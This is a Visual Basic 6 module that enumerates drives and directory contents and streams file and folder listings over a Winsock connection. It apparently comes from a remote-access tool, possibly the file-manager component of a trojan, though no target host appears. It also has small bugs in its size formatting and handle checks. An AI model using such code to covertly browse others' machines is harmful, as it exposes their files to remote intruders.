Attribute VB_Name = "mdlFileManager"
Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
Public Declare Sub Sleep Lib "kernel32" (ByVal lngMilliseconds As Long)

Declare Function ShellExecute Lib "shell32.dll" _
  Alias "ShellExecuteA" ( _
  ByVal hWnd As Long, _
  ByVal lpOperation As String, _
  ByVal lpFile As String, _
  ByVal lpParameters As String, _
  ByVal lpDirectory As String, _
  ByVal nShowCmd As Long) As Long
Const DRIVE_REMOVABLE = 2
Const DRIVE_FIXED = 3
Const DRIVE_REMOTE = 4
Const DRIVE_CDROM = 5
Const DRIVE_RAMDISK = 6
Public Const MAX_PATH = 260
Public Declare Function GetFileAttributes Lib "kernel32" Alias "GetFileAttributesA" (ByVal lpFileName As String) As Long
Dim datas As String
Dim lFirst As Long, lNext As Long, strName As String, sType As String, iData As WIN32_FIND_DATA, lAttrib As Long, iTime As FILETIME, lType As String, i As Integer
Dim sInfo As SHFILEINFO, sMod As Date
Public Type SHFILEINFO
    hIcon As Long
    iIcon As Long
    dwAttributes As Long
    szDisplayName As String * MAX_PATH
    szTypeName As String * 80
End Type
Public Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
Public Type WIN32_FIND_DATA
    dwFileAttributes As Long
    ftCreationTime As FILETIME
    ftLastAccessTime As FILETIME
    ftLastWriteTime As FILETIME
    nFileSizeHigh As Long
    nFileSizeLow As Long
    dwReserved0 As Long
    dwReserved1 As Long
    cFileName As String * 260
    cAlternate As String * 14
End Type
Public Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type
Public Const SHGFI_DISPLAYNAME = &H200
Public Const SHGFI_EXETYPE = &H2000
Public Const SHGFI_SYSICONINDEX = &H4000
Public Const SHGFI_LARGEICON = &H0
Public Const SHGFI_SMALLICON = &H1
Public Const ILD_TRANSPARENT = &H1
Public Const SHGFI_SHELLICONSIZE = &H4
Public Const SHGFI_TYPENAME = &H400
Public Const BASIC_SHGFI_FLAGS = SHGFI_TYPENAME Or SHGFI_SHELLICONSIZE Or SHGFI_SYSICONINDEX Or SHGFI_DISPLAYNAME Or SHGFI_EXETYPE
Public Const FILE_ATTRIBUTE_DIRECTORY = &H10
Public Const ERROR_NO_MORE_FILES = 18&
Public Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Public Declare Function SHGetFileInfo Lib "shell32.dll" Alias "SHGetFileInfoA" (ByVal pszPath As String, ByVal dwFileAttributes As Long, psfi As SHFILEINFO, ByVal cbFileInfo As Long, ByVal uFlags As Long) As Long
Public Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Public Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Public Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long
Public Declare Function CreateDirectory Lib "kernel32" Alias "CreateDirectoryA" (ByVal lpPathName As String, lpSecurityAttributes As SECURITY_ATTRIBUTES) As Long

Public Function FileSize(ByVal StrSize As String) As String 'Function by andy aka British_Intel
    If StrSize$ < 1024 Then
        FileSize = StrSize$ & " Bytes"
    ElseIf StrSize$ < 1048576 Then
        FileSize = Format(StrSize$ / 1024#, "###0.00") & " KB"
    ElseIf StrSize$ > 1048576 Then
        FileSize = Format(StrSize$ / 1024# ^ 2, "###0.00") & " MB"
    End If
End Function

Public Function FileExists(Fname As String) As Boolean
If Fname = "" Or Right(Fname, 1) = "\" Then
  FileExists = False: Exit Function
End If
FileExists = (Dir(Fname) <> "")
End Function
Public Function LaufwerksTyp(ByVal Drive As String) As String
Dim lType As Long
lType = GetDriveType(Drive)
  Select Case lType
    Case DRIVE_REMOVABLE
      LaufwerksTyp = "Removeable"
    Case DRIVE_FIXED
      LaufwerksTyp = "HD"
    Case DRIVE_REMOTE
      LaufwerksTyp = "Network"
    Case DRIVE_CDROM
      LaufwerksTyp = "CD-ROM"
    Case DRIVE_RAMDISK
      LaufwerksTyp = "Disc"
  End Select
End Function
Public Function GetAllDrives() As String
    Dim sBuffer As String * 255
    Dim sDrives As String
    Dim lResult As Long
    Dim sDrive As String
    Dim sPos As Integer
    lResult = GetLogicalDriveStrings(Len(sBuffer), sBuffer)
    sDrives = Left$(sBuffer, lResult)
    GetAllDrives = ""
    While Len(sDrives) > 0
        sPos = InStr(sDrives, Chr$(0))
        sDrive = Left$(sDrives, sPos - 1)
        sDrives = Mid$(sDrives, sPos + 1)
        GetAllDrives = GetAllDrives & "///" & Left$(sDrive, 2) & "[" & LaufwerksTyp(sDrive) & "]"
    Wend
End Function
Public Function StripNulls(OriginalStr As String) As String
    If (InStr(OriginalStr, Chr(0)) > 0) Then
        OriginalStr = Left(OriginalStr, InStr(OriginalStr, Chr(0)) - 1)
    End If
    StripNulls = OriginalStr
End Function

Public Sub SendFiles(lpszDirectory, Optional lpszSearchString As String = "*.*", Optional lpszParser As String = "|", Optional lpReturnFiles As Long = 1)

Dim GF As WIN32_FIND_DATA, lpgfFileName As String, lpgfGetFiles As String, lpgfSearchDir As String
Dim fileSearch As Long, MoreFiles As Long
Dim owned As String
lpgfSearchDir = lpszDirectory
If Not Right(lpgfSearchDir, 1) = "\" Then lpgfSearchDir = lpgfSearchDir & "\"
fileSearch = FindFirstFile(lpgfSearchDir & lpszSearchString, GF)
If fileSearch = INVALID_HANDLE_VALUE Then GoTo GetFilesEnd
MoreFiles = 1
    Do While MoreFiles
        lpgfFileName = StripNulls(GF.cFileName)
        If lpgfFileName = "." Then GoTo GetFilesFindNext
        If GetFileAttributes(lpgfSearchDir & lpgfFileName) And FILE_ATTRIBUTE_DIRECTORY Then
            If lpReturnFiles = 0 Then
                owned = lpgfGetFiles & lpgfFileName & lpszParser
                If Len(owned) > 1020 Then
                    Form1.WinsockFile.SendData "Fold" & lpgfGetFiles
                    Sleep 250
                    lpgfGetFiles = ""
                Else
                    lpgfGetFiles = lpgfGetFiles & lpgfFileName & lpszParser
                End If
                'send 256 bytes of file dirs at a time
            End If
        Else
            If lpReturnFiles Then
                Form1.Text23.Text = lpgfFileName
                owned = lpgfGetFiles & Form1.Text23.Text & lpszParser & FileSize(GF.nFileSizeLow) & "||"
                If Len(owned) > 1020 Then
                    Form1.WinsockFile.SendData "File" & lpgfGetFiles
                    Sleep 250
                    lpgfGetFiles = ""
                Else
                    lpgfGetFiles = lpgfGetFiles & Form1.Text23.Text & lpszParser & FileSize(GF.nFileSizeLow) & "||"
                End If
            End If
        End If
GetFilesFindNext:
    MoreFiles = FindNextFile(fileSearch, GF)
    DoEvents
    Loop
GetFilesEnd:
    If lpReturnFiles = 0 Then
        Form1.WinsockFile.SendData "Fols" & lpgfGetFiles
    Else
       Form1.WinsockFile.SendData "Fils" & lpgfGetFiles
    End If
    FindClose fileSearch
    Form1.Text23.Text = ""
End Sub




